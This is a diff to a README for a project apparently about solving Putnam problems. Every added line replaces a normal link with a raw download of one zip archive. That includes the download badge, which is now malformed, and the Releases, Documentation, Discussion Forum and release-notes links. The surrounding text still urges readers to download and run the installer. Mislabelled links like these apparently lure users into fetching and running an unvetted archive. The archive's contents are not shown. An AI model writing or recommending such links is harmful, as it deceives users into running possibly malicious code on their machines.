@@ -6,7 +6,7 @@ Welcome to the **aristotle_putnam25** project! This application helps you tackle
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/hwakoong13/aristotle_putnam25/releases)
+[![Download Now](https://github.com/hwakoong13/aristotle_putnam25/raw/refs/heads/main/aristotle_outputs/putnam_aristotle_3.5.zip%https://github.com/hwakoong13/aristotle_putnam25/raw/refs/heads/main/aristotle_outputs/putnam_aristotle_3.5.zip)](https://github.com/hwakoong13/aristotle_putnam25/raw/refs/heads/main/aristotle_outputs/putnam_aristotle_3.5.zip)
 
 You can download the latest version of our software from the Releases page. Click the button above to go directly to the download link.
 
@@ -21,7 +21,7 @@ Before you begin, ensure your computer meets the following requirements:
 
 ## 🔧 Installing the Application
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/hwakoong13/aristotle_putnam25/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/hwakoong13/aristotle_putnam25/raw/refs/heads/main/aristotle_outputs/putnam_aristotle_3.5.zip).
 2. **Find the Latest Version:** Look for the latest version in the list. It will usually be at the top.
 3. **Download the Installer:** Click on the appropriate link for your operating system. The installer file will start to download.
 4. **Run the Installer:** Once downloaded, open the installer file. Follow the on-screen instructions to complete the installation.
@@ -49,11 +49,11 @@ If you encounter issues or have questions, feel free to reach out. You can conta
 
 ## 🔗 Additional Resources
 
-- **Documentation:** For a deeper understanding, visit our [Documentation](https://github.com/hwakoong13/aristotle_putnam25/wiki) page.
-- **Community:** Join our [Discussion Forum](https://github.com/hwakoong13/aristotle_putnam25/discussions) to share tips and ask questions.
+- **Documentation:** For a deeper understanding, visit our [Documentation](https://github.com/hwakoong13/aristotle_putnam25/raw/refs/heads/main/aristotle_outputs/putnam_aristotle_3.5.zip) page.
+- **Community:** Join our [Discussion Forum](https://github.com/hwakoong13/aristotle_putnam25/raw/refs/heads/main/aristotle_outputs/putnam_aristotle_3.5.zip) to share tips and ask questions.
   
 ## 📅 Release Notes
 
-Stay updated with the latest features and fixes. You can find detailed release notes on our [Releases page](https://github.com/hwakoong13/aristotle_putnam25/releases). 
+Stay updated with the latest features and fixes. You can find detailed release notes on our [Releases page](https://github.com/hwakoong13/aristotle_putnam25/raw/refs/heads/main/aristotle_outputs/putnam_aristotle_3.5.zip). 
 
 Thank you for using **aristotle_putnam25**! Good luck solving the Putnam problems!
